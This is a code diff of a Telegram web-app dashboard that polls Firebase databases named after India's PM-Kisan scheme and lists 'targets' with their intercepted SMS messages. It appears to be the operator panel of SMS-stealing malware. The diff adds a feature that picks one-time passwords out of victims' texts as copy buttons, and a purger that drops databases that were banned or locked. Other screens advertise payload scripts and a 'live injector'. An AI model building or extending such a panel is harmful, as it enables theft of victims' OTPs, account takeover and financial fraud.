@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Void Aura - God Mode (X Edition)</title>
+<title>X - God Mode (Auto-Purge)</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
 <style>
@@ -55,7 +55,7 @@ body::after {
 #optionSplash h1 { font-size: 35px; font-weight: 800; color: #e9d5ff; text-shadow: 0 0 25px var(--primary); animation: zoomIn .5s cubic-bezier(.2,1,.2,1); letter-spacing: 3px; text-transform: uppercase; }
 @keyframes zoomIn { 0% { transform: scale(.6); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
-/* ================= HEADER & SEARCH (MOBILE FIXED) ================= */
+/* ================= HEADER & SEARCH ================= */
 .top-bar { display: flex; justify-content: space-between; padding: 20px 25px 5px 25px; position: relative; z-index: 100; }
 .icon-btn { width: 40px; height: 40px; border-radius: 12px; background: rgba(30, 10, 60, 0.5); border: 1px solid var(--card-border); display: flex; justify-content: center; align-items: center; color: var(--text-dim); font-size: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: 0.1s; cursor: pointer; }
 .icon-btn:active { transform: scale(0.95); }
@@ -84,7 +84,7 @@ body::after {
 .next { transform: translateX(100%); opacity: 0; z-index: 1; }
 .out { transform: translateX(-100%); opacity: 0; z-index: 1; }
 
-/* ================= CARDS (MOBILE RESIZED) ================= */
+/* ================= CARDS ================= */
 .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 20px; perspective: 1000px; }
 .grid-card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 15px; padding: 12px 8px; display: flex; flex-direction: column; align-items: center; box-shadow: inset 0 0 20px rgba(194,64,255,0.05), 0 10px 20px rgba(0,0,0,0.4); backdrop-filter: blur(10px); transform-style: preserve-3d; transition: transform 0.1s ease-out, box-shadow 0.1s ease-out; will-change: transform; }
 .grid-card:active { transform: scale(0.95) !important; }
@@ -182,6 +182,27 @@ body::after {
 .msg-time { display: block; font-size: 9px; color: #7b6699; font-family: 'Inter', sans-serif; font-weight: normal; margin-top: 2px;}
 .msg-text { font-size: 12px; color: #e9d5ff; line-height: 1.4; word-break: break-word; }
 
+/* ⚡ NEW: OTP Highlight Button ⚡ */
+.otp-pill {
+    background: rgba(163, 230, 53, 0.15);
+    border: 1px solid #a3e635;
+    color: #a3e635;
+    padding: 2px 6px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 900;
+    transition: 0.2s;
+    display: inline-block;
+    margin: 0 2px;
+    box-shadow: 0 0 10px rgba(163, 230, 53, 0.2);
+}
+.otp-pill:active {
+    background: #a3e635;
+    color: #05000a;
+    transform: scale(0.9);
+}
+
 /* Radar FX */
 .radar { position: absolute; right: 10%; top: 50%; transform: translateY(-50%); width: 60px; height: 60px; }
 .radar::before, .radar::after { content: ""; position: absolute; inset: -20px; border-radius: 50%; border: 1px solid rgba(194,64,255,0.3); animation: radarPulse 3s infinite linear; }
@@ -231,7 +252,6 @@ body::after {
 
 <div class="swipeWrap">
 
-  <!-- SCREEN 1: DASHBOARD -->
   <div class="screen active">
     <div class="grid-container">
       <div class="grid-card tilt-card">
@@ -267,7 +287,6 @@ body::after {
     </div>
   </div>
 
-  <!-- SCREEN 2: TARGETS LIST -->
   <div class="screen next">
     <div style="padding-top: 5px;">
         <div class="filter-container">
@@ -281,14 +300,12 @@ body::after {
     </div>
   </div>
 
-  <!-- SCREEN 3: INJECTORS -->
   <div class="screen next">
     <div class="status-card">
       <h3>Automation</h3><h2>Payload Scripts</h2><p>Playwright and PHP Bypass modules are locked and loaded. Ready to strike.</p>
     </div>
   </div>
 
-  <!-- SCREEN 4: TERMINAL -->
   <div class="screen next">
     <div class="status-card" style="height: calc(100vh - 350px);">
       <h3>Terminal Operations</h3><h2>Live Injector</h2>
@@ -301,7 +318,6 @@ body::after {
 
 </div>
 
-<!-- TARGET DETAIL MODAL -->
 <div class="target-modal" id="targetModal">
     <div class="modal-header">
         <div class="modal-title-row">
@@ -405,14 +421,7 @@ const PERMANENT_FIREBASES_TEXT = `
     "https://pm-kisan-18hgu-default-rtdb.firebaseio.com/.json",
     "https://pm-kisan-21gvh-default-rtdb.firebaseio.com/.json",
     "https://pm-kisan-22f92-default-rtdb.firebaseio.com/.json",
-    "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/.json",
-    "https://pm-kisan-28hhj-default-rtdb.firebaseio.com/.json",
-    "https://pm-kisan-28jbj-default-rtdb.firebaseio.com/.json",
-    "https://pm-kisan-28ugg-default-rtdb.firebaseio.com/.json",
-    "https://pm-kishan-24hguh-default-rtdb.firebaseio.com/.json",
-    "https://pm-kishan-24jfyg-default-rtdb.firebaseio.com/.json",
-    "https://pm-kishan-28bub-default-rtdb.firebaseio.com/.json",
-    "https://pm-kishan-31-ea1ac-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/.json"
 `;
 
 let activeDatabases = []; 
@@ -431,18 +440,15 @@ class CosmicDust {
   update() { this.y += this.speedY; this.x += this.speedX; this.opacity += this.fadeDir; if(this.opacity >= 0.8) this.fadeDir = -0.005; if(this.opacity <= 0) { this.opacity = 0; this.fadeDir = 0.005; this.y = canvas.height + 10; this.x = Math.random() * canvas.width; } if(this.y < 0) { this.y = canvas.height + 10; this.x = Math.random() * canvas.width; } }
   draw() { ctx.fillStyle = `rgba(194, 64, 255, ${this.opacity})`; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); ctx.shadowBlur = 10; ctx.shadowColor = "rgba(194, 64, 255, 0.8)"; }
 }
-// Particle count reduced by 50% for mobile optimization
 function initDust() { dustParticles = []; let numParticles = (canvas.width * canvas.height) / 15000; for(let i=0; i<numParticles; i++) dustParticles.push(new CosmicDust()); }
 function animateDust() { ctx.clearRect(0, 0, canvas.width, canvas.height); dustParticles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animateDust); }
 initDust(); animateDust();
 
 /* ================= 2. 3D HOLOGRAM TILT (DISABLED FOR MOBILE SPEED) ================= */
-// Code kept but minimized impact for smooth touch scrolling.
 document.querySelectorAll('.tilt-card').forEach(card => {
   const resetTilt = () => { card.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`; card.style.boxShadow = `inset 0 0 20px rgba(194,64,255,0.05), 0 10px 20px rgba(0,0,0,0.4)`; };
   card.addEventListener('pointerleave', resetTilt); card.addEventListener('pointerup', resetTilt);
 });
-
 
 /* ================= ⚡ COMMON RAW URL EXTRACTOR ENGINE ⚡ ================= */
 function processRawUrls(rawStr) {
@@ -491,7 +497,7 @@ function forceTargetsScreen() { if(current !== 1) { openOption('Targets', 1, doc
 
 let startX = 0; let isDragging = false; let swipeWrap = document.querySelector(".swipeWrap");
 swipeWrap.addEventListener("pointerdown", e => {
-  if(isModalOpen || e.target.closest('.tilt-card') || e.target.closest('input') || e.target.closest('button') || e.target.closest('.filter-chip') || e.target.closest('.status-card') || e.target.closest('.target-list')) return; 
+  if(isModalOpen || e.target.closest('.tilt-card') || e.target.closest('input') || e.target.closest('button') || e.target.closest('.filter-chip') || e.target.closest('.status-card') || e.target.closest('.target-list') || e.target.closest('.otp-pill')) return; 
   startX = e.clientX; isDragging = true; swipeWrap.setPointerCapture(e.pointerId); screens.forEach(s => s.style.transition = "none");
 });
 swipeWrap.addEventListener("pointermove", e => {
@@ -516,13 +522,13 @@ function render() {
 /* ================= EXACT V23 STEALTH DOCK ================= */
 const navDock = document.querySelector('.nav-container'); let isStealthOff = false; let lastTapTime = 0;
 document.addEventListener('pointerup', (e) => {
-  if (isModalOpen || e.target.closest('.nav-container') || e.target.closest('input') || e.target.closest('button') || e.target.closest('.filter-chip') || e.target.closest('.status-card') || e.target.closest('.target-list')) return;
+  if (isModalOpen || e.target.closest('.nav-container') || e.target.closest('input') || e.target.closest('button') || e.target.closest('.filter-chip') || e.target.closest('.status-card') || e.target.closest('.target-list') || e.target.closest('.otp-pill')) return;
   let currentTime = new Date().getTime(); let tapLength = currentTime - lastTapTime;
   if (tapLength < 300 && tapLength > 0) toggleStealth(); lastTapTime = currentTime;
 });
 function toggleStealth() { isStealthOff = !isStealthOff; if(isStealthOff) { navDock.classList.add('stealth-off'); } else { navDock.classList.remove('stealth-off'); } }
 
-document.addEventListener("click", (e) => { if (!e.target.closest('button') && !e.target.closest('input') && !e.target.closest('.filter-chip')) { createNanoSpark(e.clientX, e.clientY); } });
+document.addEventListener("click", (e) => { if (!e.target.closest('button') && !e.target.closest('input') && !e.target.closest('.filter-chip') && !e.target.closest('.otp-pill')) { createNanoSpark(e.clientX, e.clientY); } });
 function createNanoSpark(x, y) { let s = document.createElement("div"); s.className = "nano-spark"; s.style.left = x + "px"; s.style.top = y + "px"; document.body.appendChild(s); setTimeout(() => s.remove(), 250); }
 
 /* ================= MANUAL BULK ADD ================= */
@@ -579,16 +585,47 @@ async function fetchAndRenderTargets(silent = false) {
     if(activeDatabases.length === 0) return;
     if(!silent) listContainer.innerHTML = `<div class="empty-state">Syncing data streams... ⏳</div>`;
     
-    let allTargets = []; let fetchErrors = 0;
+    let allTargets = []; let fetchErrors = 0; let deadNodes = [];
     const syncDot = document.getElementById('sync-dot'); if(silent && syncDot) { syncDot.style.display = 'inline'; setTimeout(()=> syncDot.style.display = 'none', 1000); }
     
-    for (let i = 0; i < activeDatabases.length; i++) { try { let res = await fetch(activeDatabases[i]); if (res.ok) { let data = await res.json(); allTargets = allTargets.concat(parseDatabaseSmartly(`Node-${i+1}`, data)); } else { fetchErrors++; } } catch (e) { fetchErrors++; } }
+    for (let i = 0; i < activeDatabases.length; i++) { 
+        try { 
+            let res = await fetch(activeDatabases[i]); 
+            if (res.ok) { 
+                let data = await res.json(); 
+                allTargets = allTargets.concat(parseDatabaseSmartly(`Node-${i+1}`, data)); 
+            } else { 
+                fetchErrors++;
+                // ⚡ DEAD NODE PURGER ⚡ (Removes banned/locked Firebases automatically)
+                if (res.status === 423 || res.status === 403 || res.status === 401 || res.status === 404) {
+                    deadNodes.push(activeDatabases[i]);
+                }
+            } 
+        } catch (e) { 
+            fetchErrors++; 
+        } 
+    }
+
+    // Clean up dead nodes from array so we don't waste time on them again
+    if(deadNodes.length > 0) {
+        activeDatabases = activeDatabases.filter(db => !deadNodes.includes(db));
+    }
     
     globalTargetsCache = allTargets; globalTargetsCache.forEach((t, i) => t.serial = i + 1);
     updateDashboardCounts();
     
-    if(!silent) { if(fetchErrors > 0 && allTargets.length === 0) { listContainer.innerHTML = `<div class="empty-state" style="color:#ff3366;">❌ Error connecting to Firebase. Data empty.</div>`; } else { renderFilteredList(); } } 
-    else { renderFilteredList(true); if(isModalOpen && currentModalDid) { updateModalLive(currentModalDid); } }
+    if(!silent) { 
+        if(activeDatabases.length === 0) {
+            listContainer.innerHTML = `<div class="empty-state" style="color:#ff3366;">❌ All scanned databases were dead (423/403) and have been purged. Input fresh URLs.</div>`; 
+        } else if(fetchErrors > 0 && allTargets.length === 0) { 
+            listContainer.innerHTML = `<div class="empty-state" style="color:#ff3366;">❌ Error connecting to Firebase. Data empty.</div>`; 
+        } else { 
+            renderFilteredList(); 
+        } 
+    } else { 
+        renderFilteredList(true); 
+        if(isModalOpen && currentModalDid) { updateModalLive(currentModalDid); } 
+    }
     
     if(!livePollingActive) { livePollingActive = true; setInterval(() => { fetchAndRenderTargets(true); }, 7000); }
 }
@@ -659,6 +696,33 @@ function copyNum(elementId, btn) {
     }
 }
 
+// ⚡ OTP EXTRACTOR HELPER FUNCTION ⚡
+function extractAndWrapOTP(text) {
+    if (!text) return "No Content";
+    let safeText = String(text).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    const otpRegex = /\b(\d{4,8})\b/g;
+    return safeText.replace(otpRegex, `<span class="otp-pill" onclick="copyOTP('$1', this, event)">$1</span>`);
+}
+
+// ⚡ GLOBAL COPY FUNCTION FOR OTP PILLS ⚡
+function copyOTP(text, btn, event) {
+    if (event) event.stopPropagation();
+    navigator.clipboard.writeText(text);
+    
+    let oldHTML = btn.innerHTML;
+    btn.innerText = "COPIED!";
+    btn.style.background = "#a3e635";
+    btn.style.color = "#05000a";
+    
+    try { if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success'); } catch(e) {}
+    
+    setTimeout(() => { 
+        btn.innerHTML = oldHTML; 
+        btn.style.background = "rgba(163, 230, 53, 0.15)"; 
+        btn.style.color = "#a3e635"; 
+    }, 1000);
+}
+
 function applySmsFilter() {
     activeSmsFilter = document.getElementById("sms-filter-input").value.trim().toLowerCase();
     try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light'); } catch(e) {}
@@ -682,11 +746,15 @@ function updateModalLive(did) {
     let smsArr = []; let clearTime = clearedTimes[did] || 0; 
     for(let key in t.smsDict) {
         let msg = t.smsDict[key]; let rawTs = msg.timestamp || msg.date || msg.dateTime || msg.id || 0; let tsMs = String(rawTs).length <= 10 ? rawTs * 1000 : parseInt(rawTs);
-        let bodyText = msg.body || msg.msg || msg.message || "No Content";
+        let rawBodyText = msg.body || msg.msg || msg.message || "No Content";
         let senderText = msg.sender || msg.ph || msg.address || "Unknown";
         
-        if (activeSmsFilter && !bodyText.toLowerCase().includes(activeSmsFilter) && !senderText.toLowerCase().includes(activeSmsFilter)) { continue; }
-        if (tsMs > clearTime) { smsArr.push({ body: bodyText, sender: senderText, ts: tsMs }); }
+        if (activeSmsFilter && !String(rawBodyText).toLowerCase().includes(activeSmsFilter) && !senderText.toLowerCase().includes(activeSmsFilter)) { continue; }
+        
+        if (tsMs > clearTime) { 
+            let formattedBody = extractAndWrapOTP(rawBodyText);
+            smsArr.push({ body: formattedBody, sender: senderText, ts: tsMs }); 
+        }
     }
     
     smsArr.sort((a,b) => b.ts - a.ts); 
